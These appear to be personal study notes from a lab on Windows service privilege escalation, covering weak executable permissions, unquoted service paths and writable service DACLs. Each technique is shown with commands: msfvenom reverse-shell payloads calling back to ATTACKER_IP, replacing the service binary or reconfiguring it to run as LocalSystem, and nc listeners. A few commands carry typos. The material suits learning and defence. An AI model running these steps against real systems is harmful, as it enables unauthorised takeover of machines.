## Windows Services
Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service has an associated executable.

Check the configuration of a service:

```cmd
sc sq apphostsvc
```

![[Pasted image 20251105201435.png]]

The associated executable is specified through **BINARY_PATH_NAME**, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Each service has a Discretionary Access Control List (DACL), which indicates permissions to start, stop, query statusâ€¦ of the service.
![[Pasted image 20251105201710.png|center|400]]

All of the services configurations are stored on the registry under ``HKLM\SYSTEM\CurrentControlSet\Services\`
![[Pasted image 20251105201900.png|center]]

If DACL has been configured for the service, it will be stored in a subkey called **Security**. Only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable
The following service:

```cmd
sc qc WindowsScheduler
```

![[Pasted image 20251105202129.png|center]]
Runs as svcuser1 and the executable associated to it is `C:\PROGRA~2\SYSTEM~1\WService.exe`. We then check the permissions on the executable:

```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

![[Pasted image 20251105202300.png]]

> [!warning]
> The everyone group has modify permissions (M) on the service executable!

Create an executable with msfvenom:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

Replace the executable on the victim (first backup the original) and grant full permissions to the Everyone group:

```cmd
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

> F: Full Access. See [icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) for more details.

Start the listener:

```sh
nc -lvp 4445
```

And restart the service:

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

## Unquoted Service Paths
If the binary contains spaces like in the following case:
![[Pasted image 20251106060441.png|center]]

But it is not quoted, like the following:
![[Pasted image 20251106060458.png]]

The the SCM will search for binaries in the following way:
1. `C:\MyPrograms\Disk.exe`
2. `C:\MyPrograms\Disk Sorter.exe`
3. `C:\MyPrograms\Disk Sorter Enterprise\\bin\\disksrs.exe`

> [!Note]
> Most of the service executables will be installed under `C:\Program Files` or `C:\Programs Files (x86)`, which aren't writable by unprivileged users, which prevents any vulnerable service from being exploited.

In this example, "Disk Sorter Enterprise" is installed in `C:\MyPrograms`, which inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it:
![[Pasted image 20251106061402.png|center]]

The `BUILTIN\Users` group has `AD` and `WD` privileges:
- `AD`: Append data/add subdirectory
- `WD`: Write data/add file

So we can create a service with msfvenom as before:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

nclvp 4446
```

The move it to `C:\\MyPrograms\Disk.exe`:

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

Finally, restart the service:

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

At this point, a reverse shell should have been established.

## Insecure Service Permissions
If a service DACL (not the service's executable DACL) allows us to modify the configuration of a service, we will be able to change the executable the service points to.

To check for a service DACL form the command line, we can use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite (in this case, a copy has been created in `C:\tools`).

![[Pasted image 20251106062626.png|center|400]]

Here, the `BUILTIN\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. We can use a service similar to the ones created before:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

Then grant permissions to Everyone to execute the payload:

```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Then, change the service's associated executable and account:

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

And finally, listen with `nc` and restart the service

```sh
nc -lvp 4447
```

```sh
sc stop THMService
sc stat 
```